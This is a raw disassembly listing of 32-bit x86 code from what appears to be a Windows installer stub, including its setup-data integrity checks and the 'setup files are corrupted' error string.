  409abb:	e8 f4 93 ff ff       	call   0x402eb4
  409ac0:	c3                   	ret
  409ac1:	b9 e0 9a 40 00       	mov    $0x409ae0,%ecx
  409ac6:	b2 01                	mov    $0x1,%dl
  409ac8:	b8 50 46 40 00       	mov    $0x404650,%eax
  409acd:	e8 ae bd ff ff       	call   0x405880
  409ad2:	e8 dd 93 ff ff       	call   0x402eb4
  409ad7:	c3                   	ret
  409ad8:	ff                   	(bad)
  409ad9:	ff                   	(bad)
  409ada:	ff                   	(bad)
  409adb:	ff 47 00             	incl   0x0(%edi)
  409ade:	00 00                	add    %al,(%eax)
  409ae0:	54                   	push   %esp
  409ae1:	68 65 20 73 65       	push   $0x65732065
  409ae6:	74 75                	je     0x409b5d
  409ae8:	70 20                	jo     0x409b0a
  409aea:	66 69 6c 65 73 20 61 	imul   $0x6120,0x73(%ebp,%eiz,2),%bp
  409af1:	72 65                	jb     0x409b58
  409af3:	20 63 6f             	and    %ah,0x6f(%ebx)
  409af6:	72 72                	jb     0x409b6a
  409af8:	75 70                	jne    0x409b6a
  409afa:	74 65                	je     0x409b61
  409afc:	64 2e 20 50 6c       	fs and %dl,%cs:0x6c(%eax)
  409b01:	65 61                	gs popa
  409b03:	73 65                	jae    0x409b6a
  409b05:	20 6f 62             	and    %ch,0x62(%edi)
  409b08:	74 61                	je     0x409b6b
  409b0a:	69 6e 20 61 20 6e 65 	imul   $0x656e2061,0x20(%esi),%ebp
  409b11:	77 20                	ja     0x409b33
  409b13:	63 6f 70             	arpl   %ebp,0x70(%edi)
  409b16:	79 20                	jns    0x409b38
  409b18:	6f                   	outsl  %ds:(%esi),(%dx)
  409b19:	66 20 74 68 65       	data16 and %dh,0x65(%eax,%ebp,2)
  409b1e:	20 70 72             	and    %dh,0x72(%eax)
  409b21:	6f                   	outsl  %ds:(%esi),(%dx)
  409b22:	67 72 61             	addr16 jb 0x409b86
  409b25:	6d                   	insl   (%dx),%es:(%edi)
  409b26:	2e 00 31             	add    %dh,%cs:(%ecx)
  409b29:	d2 f0                	shl    %cl,%al
  409b2b:	09 10                	or     %edx,(%eax)
  409b2d:	c3                   	ret
  409b2e:	8b c0                	mov    %eax,%eax
  409b30:	53                   	push   %ebx
  409b31:	56                   	push   %esi
  409b32:	57                   	push   %edi
  409b33:	55                   	push   %ebp
  409b34:	83 c4 bc             	add    $0xffffffbc,%esp
  409b37:	8b f8                	mov    %eax,%edi
  409b39:	8d 74 24 28          	lea    0x28(%esp),%esi
  409b3d:	8d 44 24 04          	lea    0x4(%esp),%eax
  409b41:	50                   	push   %eax
  409b42:	e8 2d a9 ff ff       	call   0x404474
  409b47:	8b df                	mov    %edi,%ebx
  409b49:	6a 1c                	push   $0x1c
  409b4b:	56                   	push   %esi
  409b4c:	53                   	push   %ebx
  409b4d:	e8 ba a9 ff ff       	call   0x40450c
  409b52:	85 c0                	test   %eax,%eax
  409b54:	0f 84 8a 00 00 00    	je     0x409be4
  409b5a:	eb 7d                	jmp    0x409bd9
  409b5c:	81 7e 10 00 10 00 00 	cmpl   $0x1000,0x10(%esi)
  409b63:	75 60                	jne    0x409bc5
  409b65:	f6 46 15 01          	testb  $0x1,0x15(%esi)
  409b69:	75 5a                	jne    0x409bc5
  409b6b:	33 db                	xor    %ebx,%ebx
  409b6d:	8b 46 14             	mov    0x14(%esi),%eax
  409b70:	83 f8 01             	cmp    $0x1,%eax
  409b73:	74 0f                	je     0x409b84
  409b75:	83 f8 02             	cmp    $0x2,%eax
  409b78:	74 0a                	je     0x409b84
  409b7a:	83 f8 10             	cmp    $0x10,%eax
  409b7d:	74 05                	je     0x409b84
  409b7f:	83 f8 20             	cmp    $0x20,%eax
  409b82:	75 15                	jne    0x409b99
  409b84:	54                   	push   %esp
  409b85:	6a 40                	push   $0x40
  409b87:	8b 46 0c             	mov    0xc(%esi),%eax
  409b8a:	50                   	push   %eax
  409b8b:	8b 06                	mov    (%esi),%eax
  409b8d:	50                   	push   %eax
  409b8e:	e8 71 a9 ff ff       	call   0x404504
  409b93:	85 c0                	test   %eax,%eax
  409b95:	74 02                	je     0x409b99
  409b97:	b3 01                	mov    $0x1,%bl
  409b99:	33 ed                	xor    %ebp,%ebp
  409b9b:	eb 0d                	jmp    0x409baa
  409b9d:	8b 06                	mov    (%esi),%eax
  409b9f:	03 c5                	add    %ebp,%eax
  409ba1:	e8 82 ff ff ff       	call   0x409b28
  409ba6:	03 6c 24 08          	add    0x8(%esp),%ebp
  409baa:	3b 6e 0c             	cmp    0xc(%esi),%ebp
  409bad:	72 ee                	jb     0x409b9d
  409baf:	84 db                	test   %bl,%bl
  409bb1:	74 12                	je     0x409bc5
  409bb3:	54                   	push   %esp
  409bb4:	8b 44 24 04          	mov    0x4(%esp),%eax
  409bb8:	50                   	push   %eax
  409bb9:	8b 46 0c             	mov    0xc(%esi),%eax
  409bbc:	50                   	push   %eax
  409bbd:	8b 06                	mov    (%esi),%eax
  409bbf:	50                   	push   %eax
  409bc0:	e8 3f a9 ff ff       	call   0x404504
  409bc5:	8b 06                	mov    (%esi),%eax
  409bc7:	03 46 0c             	add    0xc(%esi),%eax
  409bca:	89 c3                	mov    %eax,%ebx
  409bcc:	6a 1c                	push   $0x1c
  409bce:	56                   	push   %esi
  409bcf:	53                   	push   %ebx
  409bd0:	e8 37 a9 ff ff       	call   0x40450c
  409bd5:	85 c0                	test   %eax,%eax
  409bd7:	74 0b                	je     0x409be4
  409bd9:	8b 46 04             	mov    0x4(%esi),%eax
  409bdc:	3b c7                	cmp    %edi,%eax
  409bde:	0f 84 78 ff ff ff    	je     0x409b5c
  409be4:	83 c4 44             	add    $0x44,%esp
  409be7:	5d                   	pop    %ebp
  409be8:	5f                   	pop    %edi
  409be9:	5e                   	pop    %esi
  409bea:	5b                   	pop    %ebx
  409beb:	c3                   	ret
  409bec:	53                   	push   %ebx
  409bed:	6a 0a                	push   $0xa
  409bef:	68 67 2b 00 00       	push   $0x2b67
  409bf4:	6a 00                	push   $0x0
  409bf6:	e8 f1 a7 ff ff       	call   0x4043ec
  409bfb:	8b d8                	mov    %eax,%ebx
  409bfd:	85 db                	test   %ebx,%ebx
  409bff:	75 05                	jne    0x409c06
  409c01:	e8 9a fe ff ff       	call   0x409aa0
  409c06:	53                   	push   %ebx
  409c07:	6a 00                	push   $0x0
  409c09:	e8 d6 a8 ff ff       	call   0x4044e4
  409c0e:	83 f8 2c             	cmp    $0x2c,%eax
  409c11:	74 05                	je     0x409c18
  409c13:	e8 88 fe ff ff       	call   0x409aa0
  409c18:	53                   	push   %ebx
  409c19:	6a 00                	push   $0x0
  409c1b:	e8 84 a8 ff ff       	call   0x4044a4
  409c20:	8b d8                	mov    %eax,%ebx
  409c22:	85 db                	test   %ebx,%ebx
  409c24:	75 05                	jne    0x409c2b
  409c26:	e8 75 fe ff ff       	call   0x409aa0
  409c2b:	53                   	push   %ebx
  409c2c:	e8 7b a8 ff ff       	call   0x4044ac
  409c31:	8b d8                	mov    %eax,%ebx
  409c33:	85 db                	test   %ebx,%ebx
  409c35:	75 05                	jne    0x409c3c
  409c37:	e8 64 fe ff ff       	call   0x409aa0
  409c3c:	8b c3                	mov    %ebx,%eax
  409c3e:	5b                   	pop    %ebx
  409c3f:	c3                   	ret
  409c40:	55                   	push   %ebp
  409c41:	8b ec                	mov    %esp,%ebp
  409c43:	83 c4 c4             	add    $0xffffffc4,%esp
  409c46:	53                   	push   %ebx
  409c47:	56                   	push   %esi
  409c48:	57                   	push   %edi
  409c49:	33 c0                	xor    %eax,%eax
  409c4b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409c4e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  409c51:	e8 86 94 ff ff       	call   0x4030dc
  409c56:	e8 8d a6 ff ff       	call   0x4042e8
  409c5b:	e8 1c a9 ff ff       	call   0x40457c
  409c60:	e8 53 c9 ff ff       	call   0x4065b8
  409c65:	e8 9a c9 ff ff       	call   0x406604
  409c6a:	e8 c9 f2 ff ff       	call   0x408f38
  409c6f:	e8 30 f4 ff ff       	call   0x4090a4
  409c74:	33 c0                	xor    %eax,%eax
  409c76:	55                   	push   %ebp
  409c77:	68 fc a2 40 00       	push   $0x40a2fc
  409c7c:	64 ff 30             	push   %fs:(%eax)
  409c7f:	64 89 20             	mov    %esp,%fs:(%eax)
  409c82:	33 d2                	xor    %edx,%edx
  409c84:	55                   	push   %ebp
  409c85:	68 c5 a2 40 00       	push   $0x40a2c5
  409c8a:	64 ff 32             	push   %fs:(%edx)
  409c8d:	64 89 22             	mov    %esp,%fs:(%edx)
  409c90:	a1 14 c0 40 00       	mov    0x40c014,%eax
  409c95:	e8 96 fe ff ff       	call   0x409b30
  409c9a:	e8 c9 fa ff ff       	call   0x409768
  409c9f:	8d 55 f0             	lea    -0x10(%ebp),%edx
  409ca2:	33 c0                	xor    %eax,%eax
  409ca4:	e8 83 cf ff ff       	call   0x406c2c
  409ca9:	8b 55 f0             	mov    -0x10(%ebp),%edx
  409cac:	b8 24 ce 40 00       	mov    $0x40ce24,%eax
  409cb1:	e8 32 95 ff ff       	call   0x4031e8
  409cb6:	6a 02                	push   $0x2
  409cb8:	6a 00                	push   $0x0
  409cba:	6a 01                	push   $0x1
  409cbc:	8b 0d 24 ce 40 00    	mov    0x40ce24,%ecx
  409cc2:	b2 01                	mov    $0x1,%dl
  409cc4:	b8 8c 73 40 00       	mov    $0x40738c,%eax
  409cc9:	e8 12 d8 ff ff       	call   0x4074e0
  409cce:	a3 28 ce 40 00       	mov    %eax,0x40ce28
  409cd3:	33 d2                	xor    %edx,%edx
  409cd5:	55                   	push   %ebp
  409cd6:	68 7d a2 40 00       	push   $0x40a27d
  409cdb:	64 ff 32             	push   %fs:(%edx)
  409cde:	64 89 22             	mov    %esp,%fs:(%edx)
  409ce1:	e8 06 ff ff ff       	call   0x409bec
  409ce6:	a3 30 ce 40 00       	mov    %eax,0x40ce30
  409ceb:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  409cf0:	83 78 0c 01          	cmpl   $0x1,0xc(%eax)
  409cf4:	75 48                	jne    0x409d3e
  409cf6:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  409cfb:	ba 28 00 00 00       	mov    $0x28,%edx
  409d00:	e8 13 dc ff ff       	call   0x407918
  409d05:	8b 15 30 ce 40 00    	mov    0x40ce30,%edx
  409d0b:	3b 42 28             	cmp    0x28(%edx),%eax
  409d0e:	75 2e                	jne    0x409d3e
  409d10:	8d 55 e8             	lea    -0x18(%ebp),%edx
  409d13:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  409d18:	8b 08                	mov    (%eax),%ecx
  409d1a:	ff 51 04             	call   *0x4(%ecx)
  409d1d:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  409d21:	75 20                	jne    0x409d43
  409d23:	8d 55 e0             	lea    -0x20(%ebp),%edx
  409d26:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  409d2b:	8b 08                	mov    (%eax),%ecx
  409d2d:	ff 51 04             	call   *0x4(%ecx)
  409d30:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409d33:	8b 15 30 ce 40 00    	mov    0x40ce30,%edx
  409d39:	3b 42 10             	cmp    0x10(%edx),%eax
  409d3c:	73 05                	jae    0x409d43
  409d3e:	e8 5d fd ff ff       	call   0x409aa0
  409d43:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  409d48:	8b 50 20             	mov    0x20(%eax),%edx
  409d4b:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  409d50:	e8 73 d7 ff ff       	call   0x4074c8
  409d55:	ba 40 ce 40 00       	mov    $0x40ce40,%edx
  409d5a:	b9 40 00 00 00       	mov    $0x40,%ecx
  409d5f:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  409d64:	e8 37 d7 ff ff       	call   0x4074a0
  409d69:	b8 40 ce 40 00       	mov    $0x40ce40,%eax
  409d6e:	ba 88 b1 40 00       	mov    $0x40b188,%edx
  409d73:	b9 40 00 00 00       	mov    $0x40,%ecx
  409d78:	e8 8f 89 ff ff       	call   0x40270c
  409d7d:	74 05                	je     0x409d84
  409d7f:	e8 1c fd ff ff       	call   0x409aa0
  409d84:	33 c0                	xor    %eax,%eax
  409d86:	55                   	push   %ebp
  409d87:	68 51 9e 40 00       	push   $0x409e51
  409d8c:	64 ff 30             	push   %fs:(%eax)
  409d8f:	64 89 20             	mov    %esp,%fs:(%eax)
  409d92:	68 58 7d 40 00       	push   $0x407d58
  409d97:	8b 0d 28 ce 40 00    	mov    0x40ce28,%ecx
  409d9d:	b2 01                	mov    $0x1,%dl
  409d9f:	b8 78 78 40 00       	mov    $0x407878,%eax
  409da4:	e8 7f dc ff ff       	call   0x407a28
  409da9:	a3 84 ce 40 00       	mov    %eax,0x40ce84
  409dae:	33 c0                	xor    %eax,%eax
  409db0:	55                   	push   %ebp
  409db1:	68 40 9e 40 00       	push   $0x409e40
  409db6:	64 ff 30             	push   %fs:(%eax)
  409db9:	64 89 20             	mov    %esp,%fs:(%eax)
  409dbc:	6a 1b                	push   $0x1b
  409dbe:	6a 04                	push   $0x4
  409dc0:	ba dc cc 40 00       	mov    $0x40ccdc,%edx
  409dc5:	b9 3c 01 00 00       	mov    $0x13c,%ecx
  409dca:	a1 84 ce 40 00       	mov    0x40ce84,%eax
  409dcf:	e8 34 ed ff ff       	call   0x408b08
  409dd4:	a1 78 cd 40 00       	mov    0x40cd78,%eax
  409dd9:	a3 1c ce 40 00       	mov    %eax,0x40ce1c
  409dde:	a1 1c ce 40 00       	mov    0x40ce1c,%eax
  409de3:	8b d0                	mov    %eax,%edx
  409de5:	c1 e0 06             	shl    $0x6,%eax
  409de8:	03 c2                	add    %edx,%eax
  409dea:	e8 21 ae ff ff       	call   0x404c10
  409def:	a3 18 ce 40 00       	mov    %eax,0x40ce18
  409df4:	8b 1d 1c ce 40 00    	mov    0x40ce1c,%ebx
  409dfa:	4b                   	dec    %ebx
  409dfb:	85 db                	test   %ebx,%ebx
  409dfd:	7c 29                	jl     0x409e28
  409dff:	43                   	inc    %ebx
  409e00:	33 f6                	xor    %esi,%esi
  409e02:	6a 06                	push   $0x6
  409e04:	6a 04                	push   $0x4
  409e06:	8b c6                	mov    %esi,%eax
  409e08:	c1 e0 06             	shl    $0x6,%eax
  409e0b:	03 c6                	add    %esi,%eax
  409e0d:	8b 15 18 ce 40 00    	mov    0x40ce18,%edx
  409e13:	03 d0                	add    %eax,%edx
  409e15:	b9 41 00 00 00       	mov    $0x41,%ecx
  409e1a:	a1 84 ce 40 00       	mov    0x40ce84,%eax
  409e1f:	e8 e4 ec ff ff       	call   0x408b08
  409e24:	46                   	inc    %esi
  409e25:	4b                   	dec    %ebx
  409e26:	75 da                	jne    0x409e02
  409e28:	33 c0                	xor    %eax,%eax
  409e2a:	5a                   	pop    %edx
  409e2b:	59                   	pop    %ecx
  409e2c:	59                   	pop    %ecx
  409e2d:	64 89 10             	mov    %edx,%fs:(%eax)
  409e30:	68 47 9e 40 00       	push   $0x409e47
  409e35:	a1 84 ce 40 00       	mov    0x40ce84,%eax
  409e3a:	e8 e5 8a ff ff       	call   0x402924
  409e3f:	c3                   	ret
  409e40:	e9 b7 8f ff ff       	jmp    0x402dfc
  409e45:	eb ee                	jmp    0x409e35
  409e47:	33 c0                	xor    %eax,%eax
  409e49:	5a                   	pop    %edx
  409e4a:	59                   	pop    %ecx
  409e4b:	59                   	pop    %ecx
  409e4c:	64 89 10             	mov    %edx,%fs:(%eax)
  409e4f:	eb 1b                	jmp    0x409e6c
  409e51:	e9 76 8e ff ff       	jmp    0x402ccc
  409e56:	01 00                	add    %eax,(%eax)
  409e58:	00 00                	add    %al,(%eax)
  409e5a:	80 77 40 00          	xorb   $0x0,0x40(%edi)
  409e5e:	62 9e 40 00 e8 39    	bound  %ebx,0x39e80040(%esi)
  409e64:	fc                   	cld
  409e65:	ff                   	(bad)
  409e66:	ff                   	ljmp   (bad)
  409e67:	e8 b8 90 ff ff       	call   0x402f24
  409e6c:	e8 83 fa ff ff       	call   0x4098f4
  409e71:	f6 05 12 ce 40 00 01 	testb  $0x1,0x40ce12
  409e78:	75 4a                	jne    0x409ec4
  409e7a:	80 3d 34 b2 40 00 00 	cmpb   $0x0,0x40b234
  409e81:	75 41                	jne    0x409ec4
  409e83:	6a 24                	push   $0x24
  409e85:	a1 cc cb 40 00       	mov    0x40cbcc,%eax
  409e8a:	e8 85 95 ff ff       	call   0x403414
  409e8f:	50                   	push   %eax
  409e90:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409e93:	8b 15 dc cc 40 00    	mov    0x40ccdc,%edx
  409e99:	b0 a0                	mov    $0xa0,%al
  409e9b:	e8 38 ef ff ff       	call   0x408dd8
  409ea0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409ea3:	e8 6c 95 ff ff       	call   0x403414
  409ea8:	50                   	push   %eax
  409ea9:	6a 00                	push   $0x0
  409eab:	e8 a4 a6 ff ff       	call   0x404554
  409eb0:	83 f8 06             	cmp    $0x6,%eax
  409eb3:	74 0f                	je     0x409ec4
  409eb5:	c7 05 40 b2 40 00 02 	movl   $0x2,0x40b240
  409ebc:	00 00 00 
  409ebf:	e8 90 b9 ff ff       	call   0x405854
  409ec4:	e8 fb 87 ff ff       	call   0x4026c4
  409ec9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409ecc:	e8 5f f4 ff ff       	call   0x409330
  409ed1:	8b 55 f0             	mov    -0x10(%ebp),%edx
  409ed4:	b8 34 ce 40 00       	mov    $0x40ce34,%eax
  409ed9:	e8 0a 93 ff ff       	call   0x4031e8
  409ede:	8d 55 dc             	lea    -0x24(%ebp),%edx
  409ee1:	a1 24 ce 40 00       	mov    0x40ce24,%eax
  409ee6:	e8 3d ca ff ff       	call   0x406928
  409eeb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  409eee:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409ef1:	ba 18 a3 40 00       	mov    $0x40a318,%edx
  409ef6:	e8 c5 c7 ff ff       	call   0x4066c0
  409efb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409efe:	50                   	push   %eax
  409eff:	8d 55 dc             	lea    -0x24(%ebp),%edx
  409f02:	a1 34 ce 40 00       	mov    0x40ce34,%eax
  409f07:	e8 2c c7 ff ff       	call   0x406638
  409f0c:	8b 55 dc             	mov    -0x24(%ebp),%edx
  409f0f:	b8 38 ce 40 00       	mov    $0x40ce38,%eax
  409f14:	59                   	pop    %ecx
  409f15:	e8 26 94 ff ff       	call   0x403340
  409f1a:	b8 3c ce 40 00       	mov    $0x40ce3c,%eax
  409f1f:	8b 15 38 ce 40 00    	mov    0x40ce38,%edx
  409f25:	e8 be 92 ff ff       	call   0x4031e8
  409f2a:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  409f2f:	8b 50 14             	mov    0x14(%eax),%edx
  409f32:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  409f37:	e8 8c d5 ff ff       	call   0x4074c8
  409f3c:	33 d2                	xor    %edx,%edx
  409f3e:	55                   	push   %ebp
  409f3f:	68 df a0 40 00       	push   $0x40a0df
  409f44:	64 ff 32             	push   %fs:(%edx)
  409f47:	64 89 22             	mov    %esp,%fs:(%edx)
  409f4a:	33 c0                	xor    %eax,%eax
  409f4c:	a3 80 ce 40 00       	mov    %eax,0x40ce80
  409f51:	6a 00                	push   $0x0
  409f53:	6a 01                	push   $0x1
  409f55:	6a 00                	push   $0x0
  409f57:	8b 0d 3c ce 40 00    	mov    0x40ce3c,%ecx
  409f5d:	b2 01                	mov    $0x1,%dl
  409f5f:	b8 8c 73 40 00       	mov    $0x40738c,%eax
  409f64:	e8 77 d5 ff ff       	call   0x4074e0
  409f69:	a3 2c ce 40 00       	mov    %eax,0x40ce2c
  409f6e:	33 c0                	xor    %eax,%eax
  409f70:	55                   	push   %ebp
  409f71:	68 ce a0 40 00       	push   $0x40a0ce
  409f76:	64 ff 30             	push   %fs:(%eax)
  409f79:	64 89 20             	mov    %esp,%fs:(%eax)
  409f7c:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  409f81:	8b 40 18             	mov    0x18(%eax),%eax
  409f84:	e8 0b 86 ff ff       	call   0x402594
  409f89:	a3 80 ce 40 00       	mov    %eax,0x40ce80
  409f8e:	8b 1d 80 ce 40 00    	mov    0x40ce80,%ebx
  409f94:	8b c3                	mov    %ebx,%eax
  409f96:	33 c9                	xor    %ecx,%ecx
  409f98:	8b 15 30 ce 40 00    	mov    0x40ce30,%edx
  409f9e:	8b 52 18             	mov    0x18(%edx),%edx
  409fa1:	e8 d6 87 ff ff       	call   0x40277c
  409fa6:	33 c0                	xor    %eax,%eax
  409fa8:	55                   	push   %ebp
  409fa9:	68 1b a0 40 00       	push   $0x40a01b
  409fae:	64 ff 30             	push   %fs:(%eax)
  409fb1:	64 89 20             	mov    %esp,%fs:(%eax)
  409fb4:	68 58 7d 40 00       	push   $0x407d58
  409fb9:	8b 0d 28 ce 40 00    	mov    0x40ce28,%ecx
  409fbf:	b2 01                	mov    $0x1,%dl
  409fc1:	b8 78 78 40 00       	mov    $0x407878,%eax
  409fc6:	e8 5d da ff ff       	call   0x407a28
  409fcb:	a3 84 ce 40 00       	mov    %eax,0x40ce84
  409fd0:	33 c0                	xor    %eax,%eax
  409fd2:	55                   	push   %ebp
  409fd3:	68 0a a0 40 00       	push   $0x40a00a
  409fd8:	64 ff 30             	push   %fs:(%eax)
  409fdb:	64 89 20             	mov    %esp,%fs:(%eax)
  409fde:	8b d3                	mov    %ebx,%edx
  409fe0:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  409fe5:	8b 48 18             	mov    0x18(%eax),%ecx
  409fe8:	a1 84 ce 40 00       	mov    0x40ce84,%eax
  409fed:	e8 c6 dc ff ff       	call   0x407cb8
  409ff2:	33 c0                	xor    %eax,%eax
  409ff4:	5a                   	pop    %edx
  409ff5:	59                   	pop    %ecx
  409ff6:	59                   	pop    %ecx
  409ff7:	64 89 10             	mov    %edx,%fs:(%eax)
  409ffa:	68 11 a0 40 00       	push   $0x40a011
  409fff:	a1 84 ce 40 00       	mov    0x40ce84,%eax
  40a004:	e8 1b 89 ff ff       	call   0x402924
  40a009:	c3                   	ret
  40a00a:	e9 ed 8d ff ff       	jmp    0x402dfc
  40a00f:	eb ee                	jmp    0x409fff
  40a011:	33 c0                	xor    %eax,%eax
  40a013:	5a                   	pop    %edx
  40a014:	59                   	pop    %ecx
  40a015:	59                   	pop    %ecx
  40a016:	64 89 10             	mov    %edx,%fs:(%eax)
  40a019:	eb 1b                	jmp    0x40a036
  40a01b:	e9 ac 8c ff ff       	jmp    0x402ccc
  40a020:	01 00                	add    %eax,(%eax)
  40a022:	00 00                	add    %al,(%eax)
  40a024:	80 77 40 00          	xorb   $0x0,0x40(%edi)
  40a028:	2c a0                	sub    $0xa0,%al
  40a02a:	40                   	inc    %eax
  40a02b:	00 e8                	add    %ch,%al
  40a02d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a02e:	fa                   	cli
  40a02f:	ff                   	(bad)
  40a030:	ff                   	ljmp   (bad)
  40a031:	e8 ee 8e ff ff       	call   0x402f24
  40a036:	6a 00                	push   $0x0
  40a038:	8b 1d 80 ce 40 00    	mov    0x40ce80,%ebx
  40a03e:	8b c3                	mov    %ebx,%eax
  40a040:	33 c9                	xor    %ecx,%ecx
  40a042:	8b 15 30 ce 40 00    	mov    0x40ce30,%edx
  40a048:	8b 52 18             	mov    0x18(%edx),%edx
  40a04b:	e8 e0 d8 ff ff       	call   0x407930
  40a050:	8b c3                	mov    %ebx,%eax
  40a052:	8b 15 30 ce 40 00    	mov    0x40ce30,%edx
  40a058:	8b 52 18             	mov    0x18(%edx),%edx
  40a05b:	e8 b8 d8 ff ff       	call   0x407918
  40a060:	8b 15 30 ce 40 00    	mov    0x40ce30,%edx
  40a066:	3b 42 1c             	cmp    0x1c(%edx),%eax
  40a069:	74 05                	je     0x40a070
  40a06b:	e8 30 fa ff ff       	call   0x409aa0
  40a070:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  40a075:	8b 50 18             	mov    0x18(%eax),%edx
  40a078:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  40a07d:	e8 46 d4 ff ff       	call   0x4074c8
  40a082:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  40a087:	e8 20 d6 ff ff       	call   0x4076ac
  40a08c:	33 d2                	xor    %edx,%edx
  40a08e:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  40a093:	e8 30 d4 ff ff       	call   0x4074c8
  40a098:	8b d3                	mov    %ebx,%edx
  40a09a:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  40a09f:	8b 48 18             	mov    0x18(%eax),%ecx
  40a0a2:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  40a0a7:	8b 18                	mov    (%eax),%ebx
  40a0a9:	ff 53 10             	call   *0x10(%ebx)
  40a0ac:	33 c0                	xor    %eax,%eax
  40a0ae:	5a                   	pop    %edx
  40a0af:	59                   	pop    %ecx
  40a0b0:	59                   	pop    %ecx
  40a0b1:	64 89 10             	mov    %edx,%fs:(%eax)
  40a0b4:	68 d5 a0 40 00       	push   $0x40a0d5
  40a0b9:	a1 80 ce 40 00       	mov    0x40ce80,%eax
  40a0be:	e8 e9 84 ff ff       	call   0x4025ac
  40a0c3:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  40a0c8:	e8 57 88 ff ff       	call   0x402924
  40a0cd:	c3                   	ret
  40a0ce:	e9 29 8d ff ff       	jmp    0x402dfc
  40a0d3:	eb e4                	jmp    0x40a0b9
  40a0d5:	33 c0                	xor    %eax,%eax
  40a0d7:	5a                   	pop    %edx
  40a0d8:	59                   	pop    %ecx
  40a0d9:	59                   	pop    %ecx
  40a0da:	64 89 10             	mov    %edx,%fs:(%eax)
  40a0dd:	eb 26                	jmp    0x40a105
  40a0df:	e9 e8 8b ff ff       	jmp    0x402ccc
  40a0e4:	01 00                	add    %eax,(%eax)
  40a0e6:	00 00                	add    %al,(%eax)
  40a0e8:	e0 73                	loopne 0x40a15d
  40a0ea:	40                   	inc    %eax
  40a0eb:	00 f0                	add    %dh,%al
  40a0ed:	a0 40 00 8b 40       	mov    0x408b0040,%al
  40a0f2:	0c 50                	or     $0x50,%al
  40a0f4:	e8 e3 a3 ff ff       	call   0x4044dc
  40a0f9:	b0 68                	mov    $0x68,%al
  40a0fb:	e8 48 f5 ff ff       	call   0x409648
  40a100:	e8 1f 8e ff ff       	call   0x402f24
  40a105:	b8 28 ce 40 00       	mov    $0x40ce28,%eax
  40a10a:	e8 81 ce ff ff       	call   0x406f90
  40a10f:	6a 00                	push   $0x0
  40a111:	a1 14 c0 40 00       	mov    0x40c014,%eax
  40a116:	50                   	push   %eax
  40a117:	6a 00                	push   $0x0
  40a119:	6a 00                	push   $0x0
  40a11b:	6a 00                	push   $0x0
  40a11d:	6a 00                	push   $0x0
  40a11f:	6a 00                	push   $0x0
  40a121:	6a 00                	push   $0x0
  40a123:	6a 00                	push   $0x0
  40a125:	68 20 a3 40 00       	push   $0x40a320
  40a12a:	68 34 a3 40 00       	push   $0x40a334
  40a12f:	6a 00                	push   $0x0
  40a131:	e8 f6 a3 ff ff       	call   0x40452c
  40a136:	a3 44 b2 40 00       	mov    %eax,0x40b244
  40a13b:	68 18 99 40 00       	push   $0x409918
  40a140:	6a fc                	push   $0xfffffffc
  40a142:	a1 44 b2 40 00       	mov    0x40b244,%eax
  40a147:	50                   	push   %eax
  40a148:	e8 1f a4 ff ff       	call   0x40456c
  40a14d:	a3 20 ce 40 00       	mov    %eax,0x40ce20
  40a152:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a155:	50                   	push   %eax
  40a156:	a1 44 b2 40 00       	mov    0x40b244,%eax
  40a15b:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40a15e:	c6 45 c8 00          	movb   $0x0,-0x38(%ebp)
  40a162:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  40a167:	8b 40 20             	mov    0x20(%eax),%eax
  40a16a:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40a16d:	c6 45 d0 00          	movb   $0x0,-0x30(%ebp)
  40a171:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  40a176:	8b 40 24             	mov    0x24(%eax),%eax
  40a179:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40a17c:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  40a180:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  40a183:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a188:	b8 44 a3 40 00       	mov    $0x40a344,%eax
  40a18d:	e8 f2 af ff ff       	call   0x405184
  40a192:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a195:	8b 15 24 ce 40 00    	mov    0x40ce24,%edx
  40a19b:	e8 5c 91 ff ff       	call   0x4032fc
  40a1a0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a1a3:	ba 60 a3 40 00       	mov    $0x40a360,%edx
  40a1a8:	e8 4f 91 ff ff       	call   0x4032fc
  40a1ad:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a1b0:	50                   	push   %eax
  40a1b1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a1b4:	e8 c3 c9 ff ff       	call   0x406b7c
  40a1b9:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40a1bc:	58                   	pop    %eax
  40a1bd:	e8 3a 91 ff ff       	call   0x4032fc
  40a1c2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40a1c5:	b9 40 b2 40 00       	mov    $0x40b240,%ecx
